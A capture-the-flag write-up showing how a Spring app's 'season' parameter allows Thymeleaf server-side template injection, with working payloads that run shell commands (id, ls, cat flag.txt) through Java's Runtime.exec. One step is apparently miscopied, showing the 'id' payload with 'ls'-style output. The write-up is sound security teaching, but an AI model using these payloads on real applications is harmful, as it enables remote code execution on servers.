# The Five Seasons
Did you know there were five seasons?

Find the flag file!

http://46.101.107.117:2111

---


![](seasons.png)

The URL for winter season is `/season?season=wi`.

Let's tamper the query param `?season=hello`:

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Tue Apr 20 20:42:26 UTC 2021
There was an unexpected error (type=Internal Server Error, status=500).
Error resolving template [page-hello], template might not exist or might not be accessible by any of the configured Template Resolvers
```

A quick Google search for the error message took me to
https://stackoverflow.com/questions/31944355/error-resolving-template-index-template-might-not-exist-or-might-not-be-acces.

So it's backed by [Thymeleaf](https://www.thymeleaf.org/) template engine!

Suspecting _server-side template injection_, I looked for _Thymeleaf vulnerabilities_, and I found the following
articles:
- https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
- https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability

I tested the example payload:
```
/season?season=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

It worked! See the response:
```
Error resolving template [page-uid=999(seasons)], template might not exist or might not be accessible by any of the configured Template Resolvers
```

Next, I tried:
```
/season?season=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x

Error resolving template [page-app.jar], template might not exist or might not be accessible by any of the configured Template Resolvers
```

There is one issue though, `java.util.Scanner.next()` returns just the first record ...

I changed the payload to:
```
/season?season=__${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("ls").getInputStream(),"utf-8")).lines().collect(T(java.util.stream.Collectors).joining(" "))}__::.x

Error resolving template [page-app.jar flag.txt start.sh], template might not exist or might not be accessible by any of the configured Template Resolvers
```

Nice one! Finally, read `flag.txt`:
```
/season?season=__${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("cat flag.txt").getInputStream(),"utf-8")).lines().collect(T(java.util.stream.Collectors).joining(" "))}__::.x

Error resolving template [page-well done, here is your flag: he2021{Spr1ng_1s_my_f4vrt_s34sn!}], template might not exist or might not be accessible by any of the configured Template Resolvers
```

The flag is `he2021{Spr1ng_1s_my_f4vrt_s34sn!}`